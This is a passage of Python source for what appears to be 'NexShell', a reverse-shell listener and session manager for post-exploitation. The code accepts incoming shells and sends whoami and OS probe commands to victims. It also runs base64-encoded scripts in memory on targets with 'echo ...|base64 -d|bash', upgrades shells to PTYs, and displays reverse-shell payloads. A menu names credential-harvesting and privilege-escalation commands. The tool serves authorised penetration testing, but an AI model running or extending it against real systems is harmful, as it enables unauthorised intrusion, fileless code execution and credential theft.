        speed   = "" if not hasattr(self,'speed')   else f" | {self.metric(self.speed)}/s"
        eta     = "" if not hasattr(self,'eta')     else f" | ETA {timedelta(seconds=self.eta)}"
        right = f"] {str(self.percent).rjust(3)}% ({self.metric(self.pos)}/{self.metric(self.end)}){speed}{elapsed}{eta}"
        try: cols = os.get_terminal_size().columns
        except OSError: cols = 80
        bar_space = self.barlen or (cols - len(left) - len(right))
        bars  = int(self.percent * bar_space / 100) * self.bar
        empty = '░' * (bar_space - len(bars))
        print(f'\x1b[2K{left}{paint(bars).lime}{paint(empty).darkgrey}{right}\n',
              end='', flush=True)

    def render(self):
        if hasattr(__class__,'render_lock'): __class__.render_lock.acquire()
        for pb in __class__.pbars: pb.render_one()
        print(f"\x1b[{len(__class__.pbars)}A", end='', flush=True)
        if hasattr(__class__,'render_lock'): __class__.render_lock.release()

    def print(self, data):
        if hasattr(__class__,'render_lock'): __class__.render_lock.acquire()
        print(f"\x1b[2K{data}", flush=True); self.render()
        if hasattr(__class__,'render_lock'): __class__.render_lock.release()

    def terminate(self):
        if self.queue and current_thread() != self.trace_thread:
            self.queue.join(); self.queue.put(None)
        if hasattr(__class__,'render_lock'): __class__.render_lock.acquire()
        try:
            if not self: return
            self.active = False
            if hasattr(self,'eta'): del self.eta
            if not any(__class__.pbars):
                self.render()
                print("\x1b[?25h" + '\n' * len(__class__.pbars), end='', flush=True)
                __class__.pbars.clear()
        finally:
            if hasattr(__class__,'render_lock'): __class__.render_lock.release()


# ══════════════════════════════════════════════════════════════════════════════
#  INTERFACES
# ══════════════════════════════════════════════════════════════════════════════
class Interfaces:
    def __str__(self):
        tbl = Table(joinchar=' : ')
        tbl.header = [paint('Interface').purple, paint('IP Address').purple]
        grouped = {}
        for name, ip in self.pairs: grouped.setdefault(name, []).append(ip)
        for name, ips in grouped.items():
            tbl += [paint(name).cyan, paint(', '.join(ips)).yellow]
        return str(tbl)

    def translate(self, iface):
        ifaces = self.list
        if iface in ifaces: return ifaces[iface]
        if iface in ('any','all'): return '0.0.0.0'
        return iface

    @staticmethod
    def ipa(busybox=False):
        interfaces, cur = [], None
        params = (['busybox'] if busybox else []) + ['ip', 'addr']
        try: output = subprocess.check_output(params, stderr=subprocess.DEVNULL).decode()
        except: return interfaces
        for line in output.splitlines():
            m = re.search(r"^\d+:\s+(.+?)(?:@\w+)?:", line)
            if m: cur = m[1]; continue
            if cur:
                ip = re.search(r"\binet (\d+\.\d+\.\d+\.\d+)", line)
                if ip: interfaces.append((cur, ip[1]))
        return interfaces

    @staticmethod
    def ifconfig():
        interfaces, cur = [], None
        try: output = subprocess.check_output(['ifconfig'], stderr=subprocess.DEVNULL).decode()
        except: return interfaces
        for line in output.splitlines():
            if line and not line[0].isspace():
                h = re.match(r'(\S+?):?\s', line); cur = h[1] if h else None
            elif cur:
                ip = re.search(r'\binet (?:addr:)?(\d+\.\d+\.\d+\.\d+)', line)
                if ip: interfaces.append((cur, ip[1]))
        return interfaces

    @property
    def pairs(self):
        if shutil.which("ip"):      return self.ipa()
        if shutil.which("ifconfig"): return self.ifconfig()
        if shutil.which("busybox"): return self.ipa(busybox=True)
        return []

    @property
    def list(self):
        r = {}
        for name, ip in self.pairs: r.setdefault(name, ip)
        return r

    @property
    def ips(self):
        seen, r = set(), []
        for _, ip in self.pairs:
            if ip not in seen: seen.add(ip); r.append(ip)
        return r

    @property
    def list_all(self):
        seen, r = set(), []
        for name, ip in self.pairs:
            for item in (name, ip):
                if item not in seen: seen.add(item); r.append(item)
        return r


# ══════════════════════════════════════════════════════════════════════════════
#  LINE BUFFER
# ══════════════════════════════════════════════════════════════════════════════
class LineBuffer:
    def __init__(self, length):
        self.len   = length
        self.lines = deque(maxlen=self.len)

    def __lshift__(self, data):
        if isinstance(data, str): data = data.encode()
        if self.lines and not self.lines[-1].endswith(b'\n'):
            current = self.lines.pop()
        else:
            current = b''
        self.lines.extend((current + data).split(b'\n'))
        return self

    def __bytes__(self): return b'\n'.join(self.lines)


def stdout(data, record=True):
    os.write(sys.stdout.fileno(), data)
    if record and 'core' in globals():
        core.output_line_buffer << data


def ask(text):
    while True:
        try:
            return input(f"{paint(f'[?] {text}').yellow}")
        except EOFError:
            print()
            if not sys.stdin.isatty(): return ''
        except KeyboardInterrupt:
            print("^C"); return ' '


# ══════════════════════════════════════════════════════════════════════════════
#  CONTROL QUEUE
# ══════════════════════════════════════════════════════════════════════════════
class ControlQueue:
    def __init__(self):
        self._out, self._in = os.pipe()
        self.queue = queue.Queue()
        self._lock = threading.Lock()

    def fileno(self): return self._out

    def __lshift__(self, command):
        with self._lock:
            self.queue.put(command)
            try: os.write(self._in, b'\x00')
            except OSError: pass

    def get(self):
        try: os.read(self._out, 1)
        except OSError: return 'stop'
        return self.queue.get()

    def clear(self):
        with self._lock:
            n = 0
            while not self.queue.empty():
                try: self.queue.get_nowait(); n += 1
                except queue.Empty: break
            try: os.read(self._out, n)
            except OSError: pass

    def close(self):
        for fd in (self._in, self._out):
            try: os.close(fd)
            except OSError: pass


# ══════════════════════════════════════════════════════════════════════════════
#  CORE ENGINE
# ══════════════════════════════════════════════════════════════════════════════
class Core:
    def __init__(self):
        self.started          = False
        self.control          = ControlQueue()
        self.rlist            = [self.control]
        self.wlist            = []
        self.attached_session = None
        self.conn_semaphore   = threading.Semaphore(5)
        self.listener_counter  = itertools.count(1)
        self.session_counter   = itertools.count(1)
        self.forwarding_counter = itertools.count(1)
        self.sessions          = {}
        self.listeners         = {}
        self.forwardings       = {}
        self.output_line_buffer = LineBuffer(1)
        self.wait_input        = False
        self.counter_lock      = threading.Lock()

    def __getattr__(self, name):
        if name == 'new_listenerID':
            with self.counter_lock: return next(self.listener_counter)
        if name == 'new_sessionID':
            with self.counter_lock: return next(self.session_counter)
        if name == 'new_forwardingID':
            with self.counter_lock: return next(self.forwarding_counter)
        raise AttributeError(name)

    @property
    def hosts(self):
        r = {}
        for s in tuple(self.sessions.values()):
            name = getattr(s, 'name', None)
            if name: r.setdefault(name, []).append(s)
        return r

    def start(self):
        self.started = True
        threading.Thread(target=self.loop, name="Core", daemon=True).start()

    def loop(self):
        while self.started:
            try:
                if IS_WINDOWS:
                    # Windows select() only supports sockets
                    sockets_only = [x for x in self.rlist if not isinstance(x, ControlQueue)]
                    if sockets_only:
                        readables, writables, _ = select(sockets_only, self.wlist, [], 0.1)
                    else:
                        time.sleep(0.05)
                        readables, writables = [], []
                    # Check ControlQueue manually
                    if not self.control.queue.empty():
                        command = self.control.queue.get()
                        if command:
                            try: command()
                            except Exception as e:
                                logger.error(f"Core command error: {e}")
                else:
                    readables, writables, _ = select(self.rlist, self.wlist, [])
            except (ValueError, OSError):
                for lst in (self.rlist, self.wlist):
                    for x in tuple(lst):
                        try:
                            if x.fileno() < 0: lst.remove(x)
                        except Exception:
                            try: lst.remove(x)
                            except ValueError: pass
                continue

            for readable in readables:
                if readable is self.control:
                    command = self.control.get()
                    if command:
                        try: command()
                        except Exception as e:
                            logger.error(f"Core command error: {e}")
                    break

                elif readable.__class__ is TCPListener:
                    _socket, endpoint = readable.socket.accept()
                    n_from_host = sum(
                        1 for s in tuple(self.sessions.values())
                        if s.ip == endpoint[0]
                    )
                    if n_from_host >= options.max_sessions:
                        _socket.close()
                        continue
                    threading.Thread(
                        target=Session,
                        args=(_socket, *endpoint, readable),
                        name=f"Con{endpoint}",
                        daemon=True
                    ).start()

                elif readable is sys.stdin:
                    if self.attached_session:
                        session = self.attached_session
                        data = os.read(sys.stdin.fileno(), options.network_buffer_size)
                        if data == options.escape['sequence']:
                            session.detach()
                        else:
                            session.send(data, stdin=True)

                else:
                    # Session socket — read incoming data
                    session = readable
                    try:
                        data = session.socket.recv(options.network_buffer_size)
                    except OSError:
                        data = b''
                    if not data:
                        session.kill()
                        continue
                    session.record(data)
                    # Write to response buffer for exec() collection
                    session.shell_response_buf.write(data)
                    # Echo to attached terminal
                    if self.attached_session is session:
                        try:
                            sys.stdout.buffer.write(data)
                            sys.stdout.buffer.flush()
                        except Exception:
                            pass

            for writable in writables:
                with writable.wlock:
                    try:
                        sent = writable.socket.send(writable.outbuf.getvalue())
                    except OSError:
                        writable.kill(); break
                    writable.outbuf.seek(sent)
                    remaining = writable.outbuf.read()
                    writable.outbuf.seek(0); writable.outbuf.truncate()
                    writable.outbuf.write(remaining)
                    if not remaining: self.wlist.remove(writable)

    def stop(self):
        options.maintain = 0
        for s in reversed(tuple(self.sessions.values())): s.kill()
        for l in tuple(self.listeners.values()): l.stop()
        self.control << (lambda: setattr(self, 'started', False))
        menu.stop = True
        menu.cmdqueue.append("")
        menu.active.set()


# ══════════════════════════════════════════════════════════════════════════════
#  SESSION STUB  (full session inherits from here — same arch as penelope)
# ══════════════════════════════════════════════════════════════════════════════
class Session:
    """
    Full TCP session handler.
    Keeps the proven penelope architecture, extended with:
    - Shell Intelligence auto-detection
    - Session tags + notes
    - Jitter mode
    - In-memory module execution
    """
    def __init__(self, _socket, ip, port, listener=None):
        self.socket      = _socket
        self.ip          = ip
        self.port        = port
        self.listener    = listener
        self.id          = core.new_sessionID
        self.name        = ip
        self.type        = 'Basic'
        self.subtype     = None
        self.OS          = 'Linux'
        self.user        = None
        self.is_root     = False
        self.tag         = None
        self.notes       = []
        self.connected_at = datetime.now()
        self.outbuf      = io.BytesIO()
        self.wlock       = threading.Lock()
        self.shell_response_buf = io.BytesIO()
        self.new         = True
        self.tasks       = defaultdict(list)
        self.streams     = {}
        self.agent       = False
        self.interactive = True
        core.sessions[self.id] = self
        if listener: core.rlist.append(self)
        logger.info(
            f"New shell from {paint(ip).cyan}:{paint(port).orange} "
            f"→ Session {paint(f'[{self.id}]').red}"
        )
        if options.shell_quality:
            self._announce_quality()
        # Always run fingerprint in background to identify OS, Username, and Privilege levels
        threading.Thread(target=self._fingerprint, daemon=True).start()

    def _announce_quality(self):
        score = shell_quality_score(self.type)
        logger.info(f"Shell Quality: {score}")

    def _fingerprint(self):
        # Wait a short moment for initial banner data to arrive
        time.sleep(0.8)
        initial_data = self.shell_response_buf.getvalue().decode(errors='replace')
        
        # Detect OS from initial welcome / prompt text
        detected_os = detect_os(initial_data)
        
        # Active probe — always send a quick OS detection command
        # This is critical for raw powershell/cmd shells that have no banner
        self.shell_response_buf = io.BytesIO()
        # Send both Windows and Linux probes — only one will return output
        self.send(b"echo __NEXOS__; echo %OS%; echo $env:OS\n")
        time.sleep(1.2)
        probe_out = self.shell_response_buf.getvalue().decode(errors='replace')
        
        if 'Windows_NT' in probe_out or 'Windows' in probe_out:
            detected_os = 'Windows'
        elif 'uid=' in probe_out or '/bin/' in probe_out or 'Linux' in probe_out:
            detected_os = 'Linux'
        elif detected_os == 'Linux' and not any(x in initial_data for x in ('uid=', 'Linux', '/bin/')):
            # Secondary fallback: try whoami /priv (windows-only)
            self.shell_response_buf = io.BytesIO()
            self.send(b"whoami /priv 2>nul\n")
            time.sleep(0.8)
            fallback_out = self.shell_response_buf.getvalue().decode(errors='replace')
            if 'Privilege Name' in fallback_out or 'SeShutdownPrivilege' in fallback_out:
                detected_os = 'Windows'
                
        self.OS = detected_os
        
        # Detect User & Privilege level
        self.shell_response_buf = io.BytesIO()
        self.send(b"whoami\n")
        time.sleep(0.8)
        whoami_out = self.shell_response_buf.getvalue().decode(errors='replace').strip()
        
        lines = [l.strip() for l in whoami_out.splitlines() if l.strip()]
        user = 'unknown'
        if lines:
            import re as _re
            # Skip echo, prompt lines, and noise
            skip_words = ('whoami', 'echo', '__nexos__', 'windows_nt', '$env:os', '%os%')
            for line in reversed(lines):
                ll = line.lower()
                if not any(s in ll for s in skip_words):
                    # Clean ANSI escape sequences and control chars (^G \x07, ^A, ^B, etc.)
                    clean = _re.sub(r'\x1b\[[0-9;]*[mKHABCDJsu]', '', line)
                    clean = _re.sub(r'[\x00-\x1f\x7f]', '', clean).strip()
                    if not clean:
                        continue
                    # If it looks like a shell prompt (e.g. user@host:~$ or user@host:/#)
                    # extract just the user@host part
                    prompt_match = _re.match(r'^([^:]+):\s*[~/].*?[#$]\s*$', clean)
                    if prompt_match:
                        clean = prompt_match.group(1).strip()
                    # Also strip trailing shell chars if still present
                    clean = clean.rstrip('$ #').strip()
                    if clean:
                        user = clean
                        break
        
        self.user = user
        is_root_val, priv_label, _ = detect_privilege(user)
        self.is_root = is_root_val
        
        logger.info(
            f"[+] Fingerprinted Session [{self.id}]: "
            f"OS={paint(self.OS).cyan} | User={paint(self.user).yellow} ({priv_label})"
        )
        
        # Auto-enum if enabled
        if options.auto_enum:
            plugin_name = 'auto-enum-windows' if self.OS == 'Windows' else 'auto-enum-linux'
            try:
                from core.plugin import registry as _plugin_registry
                if plugin_name in _plugin_registry:
                    logger.info(f"Auto-running plugin {plugin_name} in background for Session [{self.id}]...")
                    def _run_bg():
                        try:
                            _plugin_registry.run(plugin_name, self, [])
                        except Exception as _re:
                            logger.debug(f"Auto-run plugin {plugin_name} failed: {_re}")
                    threading.Thread(target=_run_bg, name=f"AutoEnum-{self.id}", daemon=True).start()
                elif self.OS == 'Linux':
                    logger.info("Auto-QuickEnum triggered for Linux target (in-memory)...")
                    self.exec_inmem(QUICKENUM_SCRIPT)
            except Exception as e:
                logger.debug(f"Auto-run plugin fallback failed: {e}")

        # ── v2.2: Auto TTY upgrade ─────────────────────────────────────────
        if options.auto_tty and self.OS == 'Linux' and not options.no_upgrade:
            def _auto_tty_bg():
                time.sleep(1.5)  # wait for session to stabilise
                try:
                    import importlib
                    mod = importlib.import_module('plugins.smart_tty_upgrade')
                    cls = next(
                        (getattr(mod, a) for a in dir(mod)
                         if isinstance(getattr(mod, a), type)
                         and hasattr(getattr(mod, a), 'run')
                         and getattr(mod, a).__module__ == mod.__name__),
                        None
                    )
                    if cls:
                        logger.info(f"[AUTO-TTY] Upgrading session [{self.id}] shell…")
                        cls().run(self, [])
                except Exception as _te:
                    logger.debug(f"Auto-TTY failed for [{self.id}]: {_te}")
            threading.Thread(
                target=_auto_tty_bg,
                name=f"AutoTTY-{self.id}",
                daemon=True
            ).start()

    def fileno(self): return self.socket.fileno()

    @property
    def is_attached(self):
        return core.attached_session is self

    @property
    def name_colored(self):
        priv = paint('◆ ROOT').red if self.is_root else paint('◇ user').yellow
        return f"{paint(self.name).cyan}  {priv}  [{self.tag or ''}]"

    @property
    def directory(self):
        d = options.basedir / self.name / str(self.id)
        d.mkdir(parents=True, exist_ok=True)
        return d

    def send(self, data, stdin=False):
        if options.jitter and not stdin:
            time.sleep(options.jitter / 1000)
        with self.wlock:
            self.outbuf.seek(0, 2)
            self.outbuf.write(data)
            if self not in core.wlist:
                core.wlist.append(self)

    def exec(self, cmd, timeout=10, value=True, raw=False, **kw):
        """Execute a command on the remote shell and collect output."""
        # Reset response buffer
        self.shell_response_buf = io.BytesIO()
        cmd_bytes = (cmd.strip() + '\n').encode()
        self.send(cmd_bytes)
        # Wait up to timeout seconds for stable output
        deadline = time.time() + timeout
        last_size = -1
        stable_ticks = 0
        while time.time() < deadline:
            time.sleep(0.12)
            cur = len(self.shell_response_buf.getvalue())
            if cur == last_size and cur > 0:
                stable_ticks += 1
                if stable_ticks >= 3:
                    break   # output has stopped arriving
            else:
                stable_ticks = 0
                last_size = cur
        data = self.shell_response_buf.getvalue()
        return data.decode(errors='replace') if data else ''

    def exec_inmem(self, script: str):
        """Execute a script in-memory on the target (no disk write)."""
        encoded = base64.b64encode(script.encode()).decode()
        cmd = f'echo {encoded}|base64 -d|bash'
        self.exec(cmd)

    def record(self, data, _input=False):
        try:
            logfile = self.directory / 'session.log'
            with open(logfile, 'ab') as f:
                f.write(data)
        except Exception:
            pass

    def attach(self):
        core.attached_session = self
        self.new = False
        logger.info(
            f"Attached to Session {paint(f'[{self.id}]').red}  "
            f"({self.OS} / {self.type} / "
            f"{paint(self.user or '?').yellow})  "
            f"[{paint(self.tag or 'untagged').darkgrey}]"
        )
        # Send initial newline to force the victim shell to reprint its prompt
        self.send(b"\n", stdin=True)
        if IS_WINDOWS:
            threading.Thread(target=self._windows_interact_loop, name=f"WinInteract-{self.id}", daemon=True).start()
        return True

    def _windows_interact_loop(self):
        _sep = '─' * 60
        sys.stdout.write(f"\n\033[1;32m{_sep}\033[0m\n")
        sys.stdout.write(f"\033[1;32m[*] Interactive Shell — Session [{self.id}] ({self.OS})\033[0m\n")
        sys.stdout.write(f"\033[90m    Press \033[33mCtrl+Z\033[90m or type \033[33m!back\033[90m to return to NexShell\033[0m\n")
        sys.stdout.write(f"\033[1;32m{_sep}\033[0m\n\n")
        sys.stdout.flush()

        # F12 raw escape sequence
        F12_SEQ = b'\x1b[24~'
        # Exit keywords (case-insensitive) that return to NexShell without sending to victim
        EXIT_CMDS = {'!back', '!exit', '!detach', '!q'}

        while core.attached_session is self:
            try:
                line = sys.stdin.readline()
                if not line:
                    # EOF / Ctrl+Z on Windows console
                    self.detach()
                    break

                # Check raw bytes for F12 or Ctrl+Z
                raw = line.encode('utf-8', errors='replace')
                if raw.startswith(F12_SEQ) or raw == b'\x1a\r\n' or raw == b'\x1a\n':
                    self.detach()
                    break

                # Check for NexShell escape commands (prefixed with ! to avoid ambiguity)
                cleaned = line.strip().lower()
                if cleaned in EXIT_CMDS:
                    self.detach()
                    break

                # Send to victim (send as-is, including newline)
                self.send(line.encode('utf-8', errors='replace'), stdin=True)

            except KeyboardInterrupt:
                # Ctrl+C → detach
                self.detach()
                break
            except EOFError:
                self.detach()
                break
            except Exception as e:
                logger.debug(f"Windows interact loop error: {e}")
                break


    def detach(self):
        core.attached_session = None
        logger.info(f"Detached from Session [{self.id}]")
        menu.active.set()

    def kill(self):
        try:
            self.socket.shutdown(socket.SHUT_RDWR)
            self.socket.close()
        except Exception:
            pass
        core.sessions.pop(self.id, None)
        try: core.rlist.remove(self)
        except ValueError: pass
        logger.info(f"Session [{self.id}] killed")

    def maintain(self):
        pass  # TODO: re-spawn via spawn command

    def upgrade(self):
        """Upgrade to PTY."""
        cmd = (
            "python3 -c 'import pty;pty.spawn(\"/bin/bash\")' 2>/dev/null "
            "|| python -c 'import pty;pty.spawn(\"/bin/bash\")' 2>/dev/null "
            "|| script -qc /bin/bash /dev/null"
        )
        self.exec(cmd)
        self.type = 'PTY'

    def portfwd(self, _type, lhost, lport, rhost, rport):
        logger.warning("Port forwarding: use SSH -L for now (coming in v1.1)")

    def download(self, items):
        logger.warning(f"download {items} — full implementation in v1.1")
        return []

    def upload(self, items, remote_path=None, randomize_fname=False):
        logger.warning(f"upload {items} — full implementation in v1.1")
        return []

    def script(self, item):
        logger.warning(f"script {item} — full implementation in v1.1")

    def spawn(self, port=None, host=None):
        logger.warning("spawn — full implementation in v1.1")

    def get_remote_completion(self, text):
        return []

    def __bool__(self):
        return self.id in core.sessions


# ══════════════════════════════════════════════════════════════════════════════
#  TCP LISTENER
# ══════════════════════════════════════════════════════════════════════════════
class TCPListener:
    def __init__(self, interface='any', port=4444, jump=None):
        self.interface = interface
        self.port      = int(port)
        self.jump      = jump
        self.host      = Interfaces().translate(interface)
        self.id        = core.new_listenerID
        self.socket    = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        try:
            self.socket.bind((self.host, self.port))
            self.socket.listen(5)
        except OSError as e:
            logger.error(f"Cannot bind {self.host}:{self.port} — {e}")
            return
        core.listeners[self.id] = self
        core.rlist.append(self)
        if not core.started:
            core.start()
        logger.info(
            f"Listening on {paint(self.host).cyan}:{paint(self.port).orange} "
            f"[Listener {paint(f'[{self.id}]').purple}]"
        )

    def fileno(self):
        return self.socket.fileno()

    def stop(self):
        try:
            core.rlist.remove(self)
        except ValueError:
            pass
        core.listeners.pop(self.id, None)
        try:
            self.socket.close()
        except Exception:
            pass
        logger.info(f"Listener [{self.id}] stopped")

    def __str__(self):
        return f"TCPListener({self.host}:{self.port})"

    def payloads(self, iface=None):
        host = Interfaces().translate(iface) if iface else self.host
        if host == '0.0.0.0':
            ips = Interfaces().ips or [host]
            host = ips[0]
        return PayloadGenerator.display(host, self.port, obfuscate=False)



# ══════════════════════════════════════════════════════════════════════════════
#  CONNECT  (bind shell client)
# ══════════════════════════════════════════════════════════════════════════════
def Connect(host, port):
    try: port = int(port)
    except ValueError:
        logger.error("Port must be numeric"); return False
    s = socket.socket()
    s.settimeout(5)
    handed_off = False
    try:
        s.connect((host, port))
        s.settimeout(None)
    except ConnectionRefusedError:
        logger.error(f"Connection refused → {host}:{port}")
    except OSError:
        logger.error(f"Cannot reach {host}")
    except OverflowError:
        logger.error("Invalid port. Valid: 1-65535")
    else:
        if not core.started: core.start()
        logger.info(f"Connected to {paint(host).cyan}:{paint(port).orange}")
        session = Session(s, host, port)
        if session: handed_off = True; return True
    finally:
        if not handed_off: s.close()
    return False


# ══════════════════════════════════════════════════════════════════════════════
#  MAIN MENU
# ══════════════════════════════════════════════════════════════════════════════
class BetterCMD:
    def __init__(self, prompt=None, banner=None, histfile=None, histlen=None):
        self.prompt    = prompt
        self.banner    = banner
        self.histfile  = histfile
        self.histlen   = histlen
        self.cmdqueue  = []
        self.lastcmd   = ''
        self.active    = threading.Event()
        self.stop      = False
        self._pt_session = None  # prompt_toolkit session (created lazily)

    def show(self): print(); self.active.set()

    def _build_pt_session(self):
        """Create prompt_toolkit PromptSession with NexShell autocomplete."""
        if not HAS_PROMPT_TOOLKIT:
            return None
        try:
            from datetime import datetime, timezone as _tz

            class _NexCompleter(_PTCompleter):
                def get_completions(self, document, complete_event):
                    from prompt_toolkit.completion import Completion
                    word = document.get_word_before_cursor()
                    text = document.text_before_cursor.lstrip()
                    parts = text.split()
                    # top-level commands
                    if not parts or (len(parts) == 1 and not text.endswith(" ")):
                        cmds = [a[3:] for a in dir(self._menu) if a.startswith('do_')]
                        for c in sorted(cmds):
                            if c.startswith(word):
                                yield Completion(c, start_position=-len(word))
                        return
                    # plugin sub-completions
                    if parts[0] == 'plugins':
                        for n in _list_plugin_names():
                            if n.startswith(word):
                                yield Completion(n, start_position=-len(word))

                def bind_menu(self, menu):
                    self._menu = menu
                    return self

            completer = _NexCompleter()

            hist_dir  = Path(options.basedir) / "history"
            hist_dir.mkdir(parents=True, exist_ok=True)

            style = _PTStyle.from_dict({
                "nexshell"   : "#58a6ff bold",
                "bracket"    : "#8b949e",
                "session_on" : "#3fb950 bold",
                "arrow"      : "#58a6ff bold",
                "completion-menu.completion"         : "bg:#21262d #c9d1d9",
                "completion-menu.completion.current" : "bg:#388bfd #ffffff bold",
            })

            def _toolbar():
                from datetime import datetime, timezone as _tz
                ts      = datetime.now(_tz.utc).strftime("%H:%M UTC")
                nsess   = len(core.sessions) if hasattr(core, 'sessions') else 0
                nlisten = len([r for r in (core.rlist if hasattr(core,'rlist') else [])
                               if hasattr(r, 'fileno') and not hasattr(r, 'shell_response_buf')])
                plugins = len(_list_plugin_names())
                lhost   = options.lhost
                return _PTHTML(
                    f' <b>NexShell</b> {__version__}'
                    f'  │  <b>sessions:</b> {nsess}'
                    f'  <b>lhost:</b> {lhost}'
                    f'  <b>plugins:</b> {plugins}'
                    f'  │  {ts}'
                )

            sess = _PTSession(
                history              = _PTHistory(str(hist_dir / "nexshell_history")),
                completer            = completer,
                auto_suggest         = _PTSuggest(),
                style                = style,
                complete_while_typing= True,
                bottom_toolbar       = _toolbar,
                mouse_support        = False,
            )
            sess._nexcompleter = completer
            return sess
        except Exception as e:
            logger.debug(f"prompt_toolkit session init failed: {e}")
            return None

    def start(self):
        if self.banner: print(self.banner)
        # Build prompt_toolkit session once
        if self._pt_session is None:
            self._pt_session = self._build_pt_session()
        while not self.stop:
            try:
                self.active.wait()
                if self.cmdqueue:
                    line = self.cmdqueue.pop(0)
                elif self._pt_session:
                    # Bind completer to current menu so it knows the do_* commands
                    if hasattr(self._pt_session, '_nexcompleter') and hasattr(self, '_menu_ref'):
                        self._pt_session._nexcompleter.bind_menu(self._menu_ref)
                    p_str = (self.prompt or "> ").replace('\001', '').replace('\002', '')
                    line = self._pt_session.prompt(_PTANSI(p_str))
                else:
                    line = input(self.prompt)
                line = self.precmd(line)
                stop = self.onecmd(line)
                stop = self.postcmd(stop, line)
                if stop: self.active.clear()
            except EOFError:
                self.onecmd('EOF')
            except KeyboardInterrupt:
                print("^C"); self.interrupt()
            except Exception as e:
                logger.error(f"Menu error: {e}")

    def onecmd(self, line):
        cmd, arg, line = self.parseline(line)
        if cmd:
            try:
                func = getattr(self, 'do_' + cmd)
                self.lastcmd = line
            except AttributeError:
                return self.default(line)
            return func(arg)

    def default(self, line):
        if line in ('q','quit'): return self.onecmd('exit')
        elif line == '.':        return self.onecmd('dir')
        else:
            parts = line.split(' ', 1)
            candidates = [c for c in self.raw_commands if c.startswith(parts[0])]
            if not candidates:
                cmdlogger.warning(f"Unknown command: '{line}'. Type 'help'")
            elif len(candidates) == 1:
                cmd = candidates[0] + ((' ' + parts[1]) if len(parts)==2 else '')
                return self.onecmd(cmd)
            else:
                cmdlogger.warning(f"Ambiguous: {candidates}")

    def interrupt(self):
        if core.attached_session:
            core.attached_session.detach()

    def parseline(self, line):
        line = line.lstrip()
        if not line: return None, None, line
        parts = line.split(' ', 1)
        if len(parts) == 1: return parts[0], None, line
        return parts[0], parts[1], line




    def do_exit(self, line):
        self.stop = True; self.active.clear()

    def do_quit(self, line):
        """— Exit NexShell"""
        return self.do_exit(line)

    def do_q(self, line):
        """— Exit NexShell (shortcut)"""
        return self.do_exit(line)

    def do_EOF(self, line):
        print("exit"); return self.do_exit(line)

    @property
    def raw_commands(self):
        return [a[3:] for a in dir(self.__class__) if a.startswith('do_')]

    @staticmethod
    def file_completer(text):
        matches = glob(text + '*')
        return [(m+'/' if os.path.isdir(m) else m).replace(' ','\\ ') for m in matches]

    def precmd(self, line: str) -> str:
        """Pre-process: alias resolution, typo correction."""
        line = line.strip()
        if not line:
            return line
        ui = _load_ui()
        if ui:
            line = ui.resolve_alias(line)
        # Typo correction on top-level command
        parts = line.split(' ', 1)
        if parts[0] not in self.raw_commands:
            if ui:
                suggestion = ui.suggest_command(parts[0], self.raw_commands)
                if suggestion:
                    rest = (' ' + parts[1]) if len(parts) > 1 else ''
                    fixed = suggestion + rest
                    # Auto-correct silently for close matches (>0.8), warn for moderate
                    score = __import__('difflib').SequenceMatcher(None, parts[0], suggestion).ratio()
                    if score >= 0.80:
                        return fixed
                    elif score >= 0.60:
                        print(f"  \033[2;33mDid you mean '{suggestion}'? Running it...\033[0m")
                        return fixed
        return line

    def postcmd(self, s, l): return s
    def preloop(self):  pass
    def postloop(self): pass
class MainMenu(BetterCMD):

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.sid      = None
        self._timer   = None
        self._hist_mgr= None
        self._menu_ref = self   # For prompt_toolkit completer binding
        self.commands = {
            "Session Operations":  ['run','upload','download','open','maintain','spawn','upgrade','exec','script','portfwd','tag','quickenum','credharvest','privesc','showcautions'],
            "Session Management":  ['sessions','use','interact','kill','dir|.'],
            "Shell Management":    ['listeners','payloads','connect','Interfaces'],
            # ── v2 commands ────────────────────────────────────────────────────
            "Transport":          ['transport', 'web'],
            "Database":            ['db'],
            "Operations":         ['operation', 'checklist', 'timeline', 'scope'],
            "Asset Inventory":    ['host', 'graph', 'svc'],
            "Credentials":        ['creds', 'finding'],
            "Evidence":           ['evidence'],
            "Knowledge":          ['mitre', 'playbook', 'note'],
            "Plugins":            ['plugins'],
            "Tasks":              ['task'],
            "Workflows":          ['workflow'],
            "Reporting":          ['report'],
            "Configuration":      ['config', 'template'],
            "Platform":           ['health', 'stats'],
            # ──────────────────────────────────────────────────────────────────
            "Miscellaneous":       ['help','history','lhost','share','whoami','cd','reset','clear|cls','SET','exit|quit|q'],
        }
        # Initialize UI features from the new ui module
        ui = _load_ui()
        if ui:
            self._timer    = ui.CommandTimer()
            self._hist_mgr = ui.HistoryManager()
            histfile = str(Path.home() / '.nexshell_history')
            comp = ui.setup_ui(
                get_sessions_fn  = lambda: core.sessions,
                get_listeners_fn = lambda: core.listeners,
                histfile         = histfile,
            )
            if comp:
                logger.log(logging.TRACE, "Auto-complete initialized successfully")

    def _precmd_hook(self, line: str) -> str:
        if self._timer and line.strip():
            self._timer.start(line.split()[0])
        return line

    def _postcmd_hook(self, line: str):
        elapsed_str = self._timer.stop() if self._timer else None
        if elapsed_str and sys.stdout.isatty():
            print(f"\033[2;37m{elapsed_str}\033[0m")
        if self._hist_mgr and line.strip():
            self._hist_mgr.add(line)

    def start(self):
        """Main loop — uses prompt_toolkit session (from BetterCMD) with timing hooks."""
        if self.banner:
            print(self.banner)
        # Build PT session lazily (from BetterCMD)
        if self._pt_session is None:
            self._pt_session = self._build_pt_session()
        # Bind completer to this menu so autocomplete knows our do_* methods
        if self._pt_session and hasattr(self._pt_session, '_nexcompleter'):
            self._pt_session._nexcompleter.bind_menu(self)

        while not self.stop:
            try:
                self.active.wait()
                # ── Read line ────────────────────────────────────────────────
                if self.cmdqueue:
                    raw = self.cmdqueue.pop(0)
                elif self._pt_session:
                    p_str = (self.prompt or '> ').replace('\001', '').replace('\002', '')
                    raw = self._pt_session.prompt(_PTANSI(p_str))
                else:
                    raw = input(self.prompt)

                # Ctrl+L → clear screen
                if raw in ('\x0c', '\x0c\n') or raw.strip() == '\x0c':
                    self.do_clear(None); continue

                # Empty → quick actions bar
                if not raw.strip():
                    ui = _load_ui()
                    if ui and sys.stdout.isatty():
                        ui.show_quick_actions(
                            has_session = bool(self.sid),
                            n_listeners = len(core.listeners),
                        )
                    continue

                line = self.precmd(raw)
                self._precmd_hook(line)
                stop = self.onecmd(line)
                self._postcmd_hook(line)
                stop = self.postcmd(stop, line)
                if stop:
                    self.active.clear()
            except EOFError:
